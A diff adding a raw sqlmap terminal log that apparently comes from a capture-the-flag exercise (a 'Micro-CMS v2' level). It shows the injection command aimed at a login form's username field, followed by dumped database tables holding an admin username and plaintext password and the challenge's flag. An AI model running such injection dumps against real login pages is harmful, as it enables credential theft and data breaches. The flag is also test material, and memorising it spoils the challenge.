@@ -1,0 +1,52 @@
+root@kali:~# sqlmap -u http://35.190.155.168/448554f53a//login --data "username=a&password=b" -p username --dump
+
+
+Database: level2
+Table: admins
+[1 entry]
++----+----------+----------+
+| id | username | password |
++----+----------+----------+
+| 1  | shawnee  | annie    |
++----+----------+----------+
+
+[13:57:06] [INFO] table 'level2.admins' dumped to CSV file '/root/.sqlmap/output/35.190.155.168/dump/level2/admins.csv'
+[13:57:06] [INFO] fetching columns for table 'pages' in database 'level2'
+[13:57:06] [INFO] used SQL query returns 4 entries
+[13:57:07] [INFO] retrieved: 'id'
+[13:57:07] [INFO] retrieved: 'int(11)'
+[13:57:07] [INFO] retrieved: 'public'
+[13:57:07] [INFO] retrieved: 'tinyint(1)'
+[13:57:07] [INFO] retrieved: 'title'
+[13:57:07] [INFO] retrieved: 'varchar(256)'
+[13:57:07] [INFO] retrieved: 'body'
+[13:57:08] [INFO] retrieved: 'mediumtext'
+[13:57:08] [INFO] fetching entries for table 'pages' in database 'level2'
+[13:57:08] [INFO] used SQL query returns 3 entries
+[13:57:08] [INFO] retrieved: '## Version 2\\nThis version fixed the multitude of security flaws and general functionality bugs that plagued v1.  Additionally, we added u...
+[13:57:09] [INFO] retrieved: '1'
+[13:57:09] [INFO] retrieved: '1'
+[13:57:09] [INFO] retrieved: 'Micro-CMS Changelog'
+[13:57:09] [INFO] retrieved: 'Just testing some markdown functionality.\\n\\n![adorable kitten](https://static1.squarespace.com/static/54e8ba93e4b07c3f655b452e/t/56c2a04...
+[13:57:09] [INFO] retrieved: '2'
+[13:57:10] [INFO] retrieved: '1'
+[13:57:10] [INFO] retrieved: 'Markdown Test'
+[13:57:10] [INFO] retrieved: 'My secret is ^FLAG^cb9c83396c621aa8d320239fef47f822f354702d4ffe25c45c8865d83cffd5fa$FLAG$'
+[13:57:10] [INFO] retrieved: '3'
+[13:57:10] [INFO] retrieved: '0'
+[13:57:10] [INFO] retrieved: 'Private Page'
+Database: level2
+Table: pages
+[3 entries]
++----+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+---------------------+--------+
+| id | body                                                                                                                                                                                                                                                                                                                           | title               | public |
++----+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+---------------------+--------+
+| 1  | ## Version 2\\nThis version fixed the multitude of security flaws and general functionality bugs that plagued v1.  Additionally, we added user authentication; we're still not sure why we didn't think about that the first time, but hindsight is 20/20.  By default, users need to be an admin to add or edit pages now.\\n | Micro-CMS Changelog | 1      |
+| 2  | Just testing some markdown functionality.\\n\\n![adorable kitten](https://static1.squarespace.com/static/54e8ba93e4b07c3f655b452e/t/56c2a04520c64707756f4267/1493764650017/)\\n\\n<button>Some button</button>                                                                                                                 | Markdown Test       | 1      |
+| 3  | My secret is ^FLAG^cb9c83396c621aa8d320239fef47f822f354702d4ffe25c45c8865d83cffd5fa$FLAG$                                                                                                                                                                                                                                      | Private Page        | 0      |
++----+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+---------------------+--------+
+
+[13:57:10] [INFO] table 'level2.pages' dumped to CSV file '/root/.sqlmap/output/35.190.155.168/dump/level2/pages.csv'
+[13:57:10] [INFO] fetched data logged to text files under '/root/.sqlmap/output/35.190.155.168'
+
+[*] ending @ 13:57:10 /2019-09-03/
